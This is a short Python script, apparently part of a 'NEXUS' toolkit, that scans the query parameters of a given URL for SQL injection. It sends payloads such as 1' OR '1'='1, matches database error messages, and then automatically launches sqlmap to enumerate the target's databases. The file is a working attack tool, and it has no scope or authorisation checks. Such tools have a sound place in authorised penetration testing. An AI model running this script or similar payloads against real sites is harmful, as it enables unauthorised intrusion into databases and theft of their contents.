#!/usr/bin/env python3
"""NEXUS SQLi Detector — calls sqlmap for confirmed findings"""
import requests
import subprocess
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

ERROR_PATTERNS = [
    "you have an error in your sql", "warning: mysql", "unclosed quotation",
    "quoted string not properly terminated", "sqlstate", "odbc sql server driver",
    "microsoft jet database", "syntax error", "pg_query", "postgresql"
]

PAYLOADS = ["'", "'", "1' OR '1'='1", "1 AND 1=2", "\""]

def detect(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    found = []
    for param in params:
        for payload in PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
            try:
                r = requests.get(test_url, timeout=8)
                if any(e in r.text.lower() for e in ERROR_PATTERNS):
                    print(f'[!] SQLi detected: param={param}, payload={payload}')
                    found.append(param)
                    break
            except:
                pass
    return found

def exploit(url, params):
    for p in params:
        print(f'[*] Running sqlmap on param: {p}')
        subprocess.run([
            'python3', 'data/raw_datasets/tool_scripts/web/sqlmap/sqlmap.py',
            '-u', url, '-p', p, '--batch', '--dbs', '--level', '2'
        ])

if __name__ == '__main__':
    url = sys.argv[1]
    vulns = detect(url)
    if vulns:
        exploit(url, vulns)
